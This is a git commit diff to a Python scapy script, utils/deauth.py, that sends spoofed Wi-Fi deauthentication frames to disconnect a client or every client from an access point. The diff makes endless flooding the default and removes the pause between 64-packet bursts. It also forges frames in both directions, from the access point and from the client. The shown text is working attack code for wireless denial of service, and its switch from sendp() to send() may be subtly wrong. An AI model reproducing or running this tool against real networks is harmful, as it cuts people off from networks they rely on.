5570ee16e37f0ced2ea2ce8bf7efbe81ac958c9f
Bojak4616 <jpb4616@rit.edu>
2017-04-18 04:35:09 -0400

    fixed send() vs sendp()

--- utils/deauth.py
+++ utils/deauth.py
@@ -3,7 +3,6 @@ import argparse
 import subprocess
 from sys import exit
 from scapy.all import *
-from time import sleep
 
 # Credit: https://gist.githubusercontent.com/jordan-wright/4576966/raw/5f17c9bfb747d6b2b702df3630028a097be8f399/perform_deauth.py
 def deauth(iface, ap, client, count, channel):
@@ -13,18 +12,17 @@ def deauth(iface, ap, client, count, channel):
     if client != 'FF:FF:FF:FF:FF:FF':
         cli_to_ap_pckt = Dot11(addr1=ap, addr2=client, addr3=ap) / Dot11Deauth()
     print 'Sending Deauth to ' + client + ' from ' + ap
-    if not count: print 'Press CTRL+C to quit'
+    if count == -1: print 'Press CTRL+C to quit'
     # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
     while count != 0:
         try:
             for i in range(64):
                 # Send out deauth from the AP
-                sendp(pckt, iface=iface, verbose=0)
+                send(pckt, iface=iface, verbose=0)
 		print 'Sent deauth to ' + client
                 # If we're targeting a client, we will also spoof deauth from the client to the AP
-                if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
+                if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt, iface=iface, verbose=0)
             # If count was -1, this will be an infinite loop
-                sleep(.5)
             count -= 1
         except KeyboardInterrupt:
             break
@@ -35,7 +33,7 @@ def main():
    parser.add_argument('-i', '--interface', dest='iface', type=str, required=True, help='Interface to use for deauth')
    parser.add_argument('-a', '--ap', dest='ap', type=str, required=True, help='BSSID of the access point')
    parser.add_argument('-c', '--client', dest='client', type=str, required=True, help='BSSID of the client being DeAuthenticated')
-   parser.add_argument('-n', '--packets', dest='count', type=int, required=False, help='Number of DeAuthentication packets to send')
+   parser.add_argument('-n', '--packets', dest='count', type=int, required=False, default=-1,help='Number of DeAuthentication packets to send')
    parser.add_argument('-ch', '--channel', dest='channel', type=int, required=True, help='Channel which AP and client are on')
    args = parser.parse_args()
 
@@ -46,3 +44,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
